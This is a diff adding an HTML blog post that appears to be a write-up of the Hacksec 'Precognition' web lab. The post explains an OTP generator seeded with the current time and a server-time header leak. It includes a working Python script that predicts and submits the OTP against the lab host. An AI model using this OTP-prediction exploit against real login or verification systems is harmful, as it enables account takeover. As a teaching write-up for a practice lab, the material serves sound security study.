@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Precognition writeup - Hacksec</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="yandex-verification" content="e598ba3f5d83f9cd" />
+  <link rel="icon" href="https://blog.hacksec.infavicon.png">
+
+  
+  
+  <link rel="stylesheet" href="/css/style.min.716f2dd87366be75c50babe0495f6f831c4925ca6f6a0c66c83ac32c4a258f16.css">
+  
+
+  
+    <meta name="description" content="Hello guys script is here and today we will learn in this post how we can own precognition web-lab"/>
+    <meta property="og:title" content="Precognition writeup"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:url" content="https://blog.hacksec.in/posts/precognition/"/>
+    <meta property="og:image" content="https://blog.hacksec.in/images/predictthefuture/predicthefuture.png"/>
+    <meta property="og:description" content="Hello guys script is here and today we will learn in this post how we can own precognition web-lab"/>
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:site" content="@hacksec42"/>
+    <meta name="twitter:creator" content="@hacksec42"/>
+  
+
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet"> 
+</head>
+
+
+
+
+<body class='page frame page-blog-single'>
+  <div id="wrapper" class="wrapper">
+    <div class='header'>
+  <a class="header-logo" href="https://blog.hacksec.in">Hacksec</a>
+  <div class="menu-main">
+    <ul>
+        
+        
+            <li class="menu-item-about">
+                <a href="/pages/about/">About</a>
+            </li>
+        
+            <li class="menu-item-posts">
+                <a href="/posts/">Posts</a>
+            </li>
+        
+    </ul>
+  </div>
+</div>
+    
+  <div class="blog">
+    
+    <div class="intro">
+      <h1>Precognition writeup<span class="dot">.</span></h1>
+      
+      <img src="/images/predictthefuture/predicthefuture.png" alt="precognition"/>
+      
+    </div>
+    <div class="content">
+      <h2 id="web-lab-information">Web-Lab information</h2>
+<h3 id="precognition">PRECOGNITION</h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Point:</td>
+<td>20+</td>
+</tr>
+<tr>
+<td>Level:</td>
+<td>EASY</td>
+</tr>
+<tr>
+<td>Target:</td>
+<td><a href="http://machine9.hacksec.in">http://machine9.hacksec.in</a></td>
+</tr>
+<tr>
+<td>First ownby:</td>
+<td><a href="https://www.app.hacksec.in/profile/158">n00bmast3r</a></td>
+</tr>
+<tr>
+<td>Created by:</td>
+<td><a href="https://www.app.hacksec.in/profile/1">SCRIPT1337X</a></td>
+</tr>
+</tbody>
+</table>
+<h2 id="lets-start">let&rsquo;s start</h2>
+<p>First of all, let&rsquo;s see what we have to work on by opening the URL.
+<img src="/images/predictthefuture/1.png" alt="HomePage"></p>
+<h2 id="reading-source-code">Reading source code</h2>
+<p>Source code is available here : <a href="https://machine9.hacksec.in/download/source_code">https://machine9.hacksec.in/download/source_code</a>
+<img src="/images/predictthefuture/2.png" alt="Source_code"></p>
+<h2 id="vulnerable-function">Vulnerable function</h2>
+<p>Send OTP function generates the OTP, and it&rsquo;s vulnerable because it&rsquo;s using the current time as a seed to generate OTP using randint.
+<img src="/images/predictthefuture/3.png" alt="Vulnerable_function"></p>
+<h2 id="finding-current-server-time">Finding current server time</h2>
+<p>If we read the custom_response function, we can see we can get the current server time in the server_time response header
+<img src="/images/predictthefuture/4.png" alt="custom_response">
+<img src="/images/predictthefuture/5.png" alt="server_time"></p>
+<h2 id="write-exploit">Write exploit</h2>
+<p>So we have everything, so lets create our exploit now</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">from flask import json
+import requests
+from threading import Thread
+from random import seed
+from random import randint
+import <span class="nb">time</span>
+import json
+
+<span class="nv">data</span> <span class="o">=</span> requests.get<span class="o">(</span><span class="s2">&#34;https://machine9.hacksec.in/server/info&#34;</span><span class="o">)</span>.headers
+<span class="nv">server_time</span> <span class="o">=</span> float<span class="o">(</span>data<span class="o">[</span><span class="s2">&#34;server_time&#34;</span><span class="o">])</span>
+<span class="c1">#print(server_time)</span>
+<span class="nv">secx</span> <span class="o">=</span> round<span class="o">(</span>time.time<span class="o">()</span> * 1000<span class="o">)</span> / <span class="m">1000</span>
+print<span class="o">(</span>int<span class="o">(</span>secx<span class="o">))</span>
+print<span class="o">(</span>int<span class="o">(</span>secx<span class="o">)</span> + 5<span class="o">)</span>
+seed<span class="o">(</span>int<span class="o">(</span>secx<span class="o">)</span> + 5<span class="o">)</span>
+<span class="nv">otp</span> <span class="o">=</span> <span class="o">[</span>9999, 0000<span class="o">]</span>
+<span class="nv">generated_otp</span> <span class="o">=</span> randint<span class="o">(</span>otp<span class="o">[</span>1<span class="o">]</span>, otp<span class="o">[</span>0<span class="o">])</span>
+print<span class="o">(</span>generated_otp<span class="o">)</span>
+<span class="nv">count</span> <span class="o">=</span> <span class="m">0</span>
+<span class="k">while</span> True:
+    <span class="nv">count</span> <span class="o">+=</span> <span class="m">1</span>
+    print<span class="o">(</span><span class="s2">&#34;Try for &#34;</span> + str<span class="o">(</span>count<span class="o">))</span>
+    <span class="nv">data</span> <span class="o">=</span> requests.post<span class="o">(</span><span class="s2">&#34;https://machine9.hacksec.in/send/otp&#34;</span>, <span class="nv">json</span><span class="o">={</span><span class="s2">&#34;otp&#34;</span>: generated_otp<span class="o">})</span>.content
+    <span class="nv">data</span> <span class="o">=</span> json.loads<span class="o">(</span>data<span class="o">)</span>
+    <span class="k">if</span> data<span class="o">[</span><span class="s2">&#34;data&#34;</span><span class="o">]</span> !<span class="o">=</span> <span class="s2">&#34;Wrong OTP&#34;</span>:
+        print<span class="o">(</span><span class="s2">&#34;[+] OTP sent successfully&#34;</span><span class="o">)</span>
+        print<span class="o">(</span>data<span class="o">)</span>
+        <span class="nb">break</span>
+</code></pre></div><h2 id="read-hashtxt">Read hash.txt</h2>
+<p>Done
+<img src="/images/predictthefuture/6.png" alt="hash.txt"></p>
+
+    </div>
+  </div>
+
+    <div class="footer">
+  
+  <div class="footer-social">
+    
+    <span class="social-icon social-icon-twitter">
+      <a href="https://twitter.com/hacksec42" title="twitter" target="_blank" rel="noopener">
+        <img
+          src="/images/social/twitter.svg"
+          width="24"
+          height="24"
+          alt="twitter"
+          style="background-color: white"
+        />
+      </a>
+    </span>
+    
+    <span class="social-icon social-icon-github">
+      <a href="https://github.com/hacksec-in" title="github" target="_blank" rel="noopener">
+        <img
+          src="/images/social/github.svg"
+          width="24"
+          height="24"
+          alt="github"
+          style="background-color: white"
+        />
+      </a>
+    </span>
+    
+    <span class="social-icon social-icon-linkedin">
+      <a href="https://www.linkedin.com/in/rishi-roy-a986381a6/" title="linkedin" target="_blank" rel="noopener">
+        <img
+          src="/images/social/linkedin.svg"
+          width="24"
+          height="24"
+          alt="linkedin"
+          style="background-color: white"
+        />
+      </a>
+    </span>
+    
+  </div>
+  
+</div>
+
+  </div>
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="/js/bundle.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.js"></script>
+  
+
+  
+  
+
+  
+  
+  
+    
+      
+      <script async src="https://www.googletagmanager.com/gtag/js?id=UA-204818072-3"></script>
+      <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-204818072-3');
+      </script>
+    
+  
+
+
+</body>
+</html>
